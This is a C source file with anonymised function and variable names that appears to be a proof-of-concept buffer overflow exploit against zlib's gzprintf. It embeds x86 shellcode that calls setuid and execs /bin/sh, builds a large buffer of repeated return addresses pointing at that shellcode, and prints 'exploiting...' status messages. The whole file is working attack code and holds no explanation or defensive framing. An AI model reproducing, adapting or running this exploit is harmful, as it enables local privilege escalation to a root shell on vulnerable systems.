
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int gzFile ;
typedef int badbuff ;


 int FUNC_0 (char*,int) ;
 int VAR_0 ;
 int FUNC_1 (int) ;
 int FUNC_2 (int ) ;
 int FUNC_3 (char*,char*) ;
 int FUNC_4 (int ,char*,char*) ;
 int FUNC_5 (char*) ;
 int FUNC_6 (char*,...) ;
 int FUNC_7 (int ) ;
 int FUNC_8 (int ) ;
 int FUNC_9 (char*,char*,...) ;
 int FUNC_10 (char*,char*,long*) ;
 int VAR_1 ;
 int FUNC_11 (char*,char*) ;

int FUNC_12(int VAR_2, char **VAR_3) {
        char VAR_4[]=
                "\x90\x90\x90\x90\x90\x90\x90\x90"
                "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
                "\xb0\x2e\xcd\x80\xeb\x15\x5b\x31"
                "\xc0\x88\x43\x07\x89\x5b\x08\x89"
                "\x43\x0c\x8d\x4b\x08\x31\xd2\xb0"
                "\x0b\xcd\x80\xe8\xe6\xff\xff\xff"
                "/bin/sh";
        gzFile VAR_5;
        int VAR_6;
        long VAR_7;
        char VAR_8[10];
        char VAR_9[10000];
        int VAR_10;

        FUNC_9(VAR_9,"%p",VAR_4);
        FUNC_10(VAR_9,"0x%x",&VAR_7);

        FUNC_6("[>] exploiting...\n");

        if(!(VAR_5 = FUNC_3("/dev/null", "w"))) {
                FUNC_5("/dev/null");
                FUNC_1(1);
        }

        FUNC_6("[>] xret = 0x%x\n",VAR_7);


FUNC_9(VAR_8,"%c%c%c%c",(VAR_7&0xff)+4,(VAR_7>>8)&0xff,

(VAR_7>>16)&0xff,(VAR_7>>24)&0xff);

        FUNC_0(VAR_9,sizeof(VAR_9));

        for(VAR_10=0;VAR_10<5000;VAR_10+=4) FUNC_11(VAR_9,VAR_8);

        FUNC_8(0);
        FUNC_7(0);
        VAR_6 = FUNC_4(VAR_1, "%s", VAR_9 );
        FUNC_8(0);
        FUNC_7(0);
        FUNC_6(">Sent!..\n");
        FUNC_6("gzprintf -> %d\n", VAR_6);
        VAR_6 = FUNC_2(VAR_5);
        FUNC_6("gzclose -> %d [%d]\n", VAR_6, VAR_0);

        FUNC_1(0);
}
